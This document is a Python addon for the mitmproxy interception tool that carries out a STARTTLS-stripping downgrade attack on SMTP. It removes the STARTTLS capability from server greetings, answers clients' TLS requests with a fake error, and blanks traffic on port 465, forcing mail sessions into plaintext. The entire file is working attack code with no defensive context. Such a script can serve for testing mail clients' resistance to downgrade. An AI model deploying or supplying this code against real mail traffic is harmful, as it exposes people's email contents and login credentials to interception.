from mitmproxy import ctx
from mitmproxy import tcp, http, tls
import mitmproxy
from collections import defaultdict
from mitmproxy import command, flow
from typing import Sequence
import base64
import re

class smtp_TCP:
    def __init__(self) -> None:
        self.view = ctx.master.addons.get("view")
    
    def tcp_message(self, flow:tcp.TCPFlow):
        msg = flow.messages[-1] # latest message
        host_name = flow.server_conn.peername # ip, port
        
        if not msg.from_client:
            server_msg = bytearray(msg.content)
            # ctx.log.warn(server_msg)
            if flow.server_conn.peername[1] == 465: # prevent it to run tls
                server_msg = b''
                msg.content = server_msg

            # if client insists to starttls
            if b'220 2.0.0 Ready to start TLS' in server_msg:
                ctx.log.warn('client sends starttls')
                server_msg[0:] = b'502 5.5.2 Error: command not recognized\r\n'
                msg.content = server_msg
                ctx.log.info(msg.content)
            if b'STARTTLS' in server_msg:
                position = server_msg.find(b'250-STARTTLS')
                ctx.log.warn(f"starttls in position {server_msg.find(b'STARTTLS')}")
                # remove the starttls
                server_msg[position:position+8+6] = b''
                msg.content = server_msg

addons = [smtp_TCP()]